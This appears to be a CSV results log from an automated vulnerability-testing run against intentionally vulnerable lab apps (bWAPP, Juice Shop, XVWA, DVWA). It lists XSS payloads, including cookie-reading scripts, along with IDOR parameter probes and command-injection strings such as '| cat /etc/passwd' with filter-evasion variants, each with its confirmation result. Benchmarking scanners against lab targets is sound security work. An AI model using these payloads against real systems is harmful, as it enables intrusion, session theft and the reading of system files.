+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Basic,2,<script>confirm(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:48:44.584428+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Basic,3,<script>alert(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,204,,2026-10-19T02:48:44.785733+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Basic,4,<svg onload=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,218,,2026-10-19T02:48:45.009052+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Basic,5,<body onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:48:45.224941+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Basic,6,<svg onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:48:45.425156+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Basic,7,<img src=x onerror=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,218,,2026-10-19T02:48:45.642019+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Basic,8,%3CScRiPt%3Eprompt(1)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:48:45.857429+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Basic,9,<script>prompt(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:48:46.069455+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Basic,10,<img src=x onerror=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:48:46.289916+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Basic,11,<script>alert(document.cookie)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,218,,2026-10-19T02:48:46.512513+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Basic,12,<ScRiPt>alert(1)</ScRiPt>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:48:46.722036+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Basic,13,%3Csvg%20onload=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:48:46.938957+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Basic,14,%3Cscript%3Ealert(document.cookie)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:48:47.146307+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Basic,15,%3Csvg%20onload=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:48:47.362292+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,1,<img src=x onerror=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:48:47.574012+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,2,<script>alert(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:48:47.795728+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,3,<script>alert(document.cookie)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,218,,2026-10-19T02:48:48.007120+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,4,<svg onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:48:48.219156+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,5,<img src=x onerror=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,204,,2026-10-19T02:48:48.421294+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,6,%3Cimg%20src=x%20onerror=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:48:48.627188+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,7,<body onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,218,,2026-10-19T02:48:48.843590+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,8,<ScRiPt>prompt(1)</ScRiPt>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,204,,2026-10-19T02:48:49.045001+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,9,<ScRiPt>alert(1)</ScRiPt>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,218,,2026-10-19T02:48:49.259794+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,10,<script>confirm(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:48:49.482052+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,11,<svg onload=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:48:49.701667+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,12,%3Ciframe%20src=javascript:alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:48:49.901421+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,13,%3CScRiPt%3Econfirm(1)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:48:50.123577+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,14,%3Csvg%20onload=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,218,,2026-10-19T02:48:50.347214+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,15,%3Cscript%3Ealert(document.cookie)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:48:50.557664+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,16,%3CScRiPt%3Ealert(document.cookie)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,235,,2026-10-19T02:48:50.790279+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,17,<iframe src=javascript:alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,171,,2026-10-19T02:48:50.965696+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,18,<ScRiPt>confirm(1)</ScRiPt>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,204,,2026-10-19T02:48:51.164074+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,19,<script>prompt(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:48:51.373853+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,20,<ScRiPt>alert(document.cookie)</ScRiPt>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:48:51.582570+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,21,%3Cimg%20src=x%20onerror=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:48:51.788450+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Advanced,22,%3Cscript%3Eprompt(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:48:51.997891+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Evasion,1,%3Cimg%20src=x%20onerror=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,218,,2026-10-19T02:48:52.220412+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Evasion,2,%3Cscript%3Ealert(document.cookie)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,204,,2026-10-19T02:48:52.421292+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Evasion,3,%3Csvg%20onload=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:48:52.620314+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Evasion,4,%3CScRiPt%3Econfirm(1)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:48:52.828375+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Evasion,5,%3Cscript%3Eprompt(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:48:53.044557+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Evasion,6,%3Csvg%20onload=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,218,,2026-10-19T02:48:53.268442+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Evasion,7,%3Cimg%20src=x%20onerror=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,235,,2026-10-19T02:48:53.503075+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Evasion,8,%3Cbody%20onload=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,297,,2026-10-19T02:48:53.786504+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Evasion,9,%3Ciframe%20src=javascript:alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,296,,2026-10-19T02:48:54.084947+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Evasion,10,%3Cscript%3Ealert(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,204,,2026-10-19T02:48:54.293714+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Evasion,11,%3Cscript%3Econfirm(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,218,,2026-10-19T02:48:54.507676+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Evasion,12,%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:48:54.706839+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Evasion,13,%3CScRiPt%3Eprompt(1)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:48:54.918996+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XSS,Evasion,14,%3CScRiPt%3Ealert(document.cookie)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,218,,2026-10-19T02:48:55.140362+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Basic,1,user=2,401,NO_CONFIRMATION_SIGNAL,false,,,422,,2026-10-19T02:48:59.029656+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Basic,2,id=100,401,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:48:59.065122+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Basic,3,id=3,401,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:48:59.075655+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Basic,4,id=1,401,NO_CONFIRMATION_SIGNAL,false,,,359,,2026-10-19T02:48:59.402671+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Basic,5,id=103,401,NO_CONFIRMATION_SIGNAL,false,,,359,,2026-10-19T02:48:59.406671+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Basic,6,account=1,401,NO_CONFIRMATION_SIGNAL,false,,,359,,2026-10-19T02:48:59.407709+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Basic,7,id=2,401,NO_CONFIRMATION_SIGNAL,false,,,359,,2026-10-19T02:48:59.407709+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Basic,8,account=2,401,NO_CONFIRMATION_SIGNAL,false,,,344,,2026-10-19T02:48:59.407709+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Basic,9,user=1,401,NO_CONFIRMATION_SIGNAL,false,,,344,,2026-10-19T02:48:59.407709+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Basic,10,user=3,401,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:59.079284+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Advanced,1,account=2,401,NO_CONFIRMATION_SIGNAL,false,,,15,,2026-10-19T02:48:59.090132+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Advanced,2,user=3,401,NO_CONFIRMATION_SIGNAL,false,,,15,,2026-10-19T02:48:59.093846+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Advanced,3,id=100,401,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:59.104019+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Advanced,4,id=1,401,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:59.108309+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Advanced,5,user=2,401,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:59.118394+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Advanced,6,id=3,401,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:59.122623+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Advanced,7,user=1,401,NO_CONFIRMATION_SIGNAL,false,,,15,,2026-10-19T02:48:59.132937+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Advanced,8,id=2,401,NO_CONFIRMATION_SIGNAL,false,,,15,,2026-10-19T02:48:59.136299+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Advanced,9,account=1,401,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:59.147484+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Advanced,10,id=103,401,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:59.151162+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Advanced,11,id=4,401,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:59.161080+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Evasion,1,id=2,401,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:59.164691+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Evasion,2,user=1,401,NO_CONFIRMATION_SIGNAL,false,,,0,,2026-10-19T02:48:59.175545+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Evasion,3,id=100,401,NO_CONFIRMATION_SIGNAL,false,,,15,,2026-10-19T02:48:59.178754+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Evasion,4,user=2,401,NO_CONFIRMATION_SIGNAL,false,,,15,,2026-10-19T02:48:59.190764+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Evasion,5,id=1,401,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:59.194237+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Evasion,6,account=1,401,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:59.205257+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Evasion,7,id=4,401,NO_CONFIRMATION_SIGNAL,false,,,15,,2026-10-19T02:48:59.208878+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Evasion,8,id=3,401,NO_CONFIRMATION_SIGNAL,false,,,15,,2026-10-19T02:48:59.219729+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Evasion,9,account=2,401,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:59.223386+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Evasion,10,user=3,401,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:59.234673+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,IDOR,Evasion,11,id=103,401,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:59.238937+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Basic,1,user=2,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,359,,2026-10-19T02:48:58.583159+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Basic,2,id=100,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,63,,2026-10-19T02:48:58.299075+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Basic,3,id=3,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,78,,2026-10-19T02:48:58.339880+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Basic,4,id=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,62,,2026-10-19T02:48:58.346010+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Basic,5,id=103,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,78,,2026-10-19T02:48:58.351274+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Basic,6,account=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,78,,2026-10-19T02:48:58.361389+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Basic,7,id=2,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,78,,2026-10-19T02:48:58.366704+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Basic,8,account=2,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,78,,2026-10-19T02:48:58.372233+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Basic,9,user=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,109,,2026-10-19T02:48:58.398909+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Basic,10,user=3,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,94,,2026-10-19T02:48:58.432427+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Advanced,1,account=2,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,110,,2026-10-19T02:48:58.444136+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Advanced,2,user=3,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,94,,2026-10-19T02:48:58.453809+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Advanced,3,id=100,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,109,,2026-10-19T02:48:58.457953+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Advanced,4,id=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,93,,2026-10-19T02:48:58.464896+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Advanced,5,user=2,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,93,,2026-10-19T02:48:58.469160+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Advanced,6,id=3,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,78,,2026-10-19T02:48:58.479443+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Advanced,7,user=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,63,,2026-10-19T02:48:58.499593+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Advanced,8,id=2,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,94,,2026-10-19T02:48:58.543611+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Advanced,9,account=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,94,,2026-10-19T02:48:58.547189+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Advanced,10,id=103,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,94,,2026-10-19T02:48:58.555619+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Advanced,11,id=4,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,94,,2026-10-19T02:48:58.561080+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Evasion,1,id=2,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,94,,2026-10-19T02:48:58.565805+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Evasion,2,user=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,94,,2026-10-19T02:48:58.570663+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Evasion,3,id=100,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,93,,2026-10-19T02:48:58.596603+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Evasion,4,user=2,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,62,,2026-10-19T02:48:58.602222+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Evasion,5,id=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,62,,2026-10-19T02:48:58.612716+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Evasion,6,account=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,47,,2026-10-19T02:48:58.612716+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Evasion,7,id=4,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,47,,2026-10-19T02:48:58.612716+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Evasion,8,id=3,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,47,,2026-10-19T02:48:58.612716+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Evasion,9,account=2,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,47,,2026-10-19T02:48:58.616368+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Evasion,10,user=3,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,32,,2026-10-19T02:48:58.617375+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,IDOR,Evasion,11,id=103,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,32,,2026-10-19T02:48:58.624216+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Basic,1,&& uname -a,200,NO_CONFIRMATION_SIGNAL,false,,,203,,2026-10-19T02:48:59.427676+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Basic,2,| cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,15,,2026-10-19T02:48:59.269498+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Basic,3,; pwd,200,NO_CONFIRMATION_SIGNAL,false,,,32,,2026-10-19T02:48:59.288399+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Basic,4,|${IFS}cat${IFS}/etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,46,,2026-10-19T02:48:59.334591+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Basic,5,&& id,200,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:59.353097+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Basic,6,;${IFS}cat${IFS}/etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,47,,2026-10-19T02:48:59.398188+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Basic,7,; ls,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:48:59.441641+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Basic,8,; whoami,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:48:59.450891+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Basic,9,| whoami,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:48:59.451420+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Basic,10,; cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,31,,2026-10-19T02:48:59.487684+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Basic,11,&&${IFS}uname${IFS}-a,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:48:59.497281+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Basic,12,;${IFS}ls,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:48:59.512598+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Basic,13,;${IFS}pwd,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:59.520357+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Basic,14,|$IFScat$IFS/etc/passwd,200,NO_CONFIRMATION_SIGNAL,false,,,79,,2026-10-19T02:48:59.539278+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,Command Injection,Basic,15,;${IFS}whoami,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:59.527545+00:00
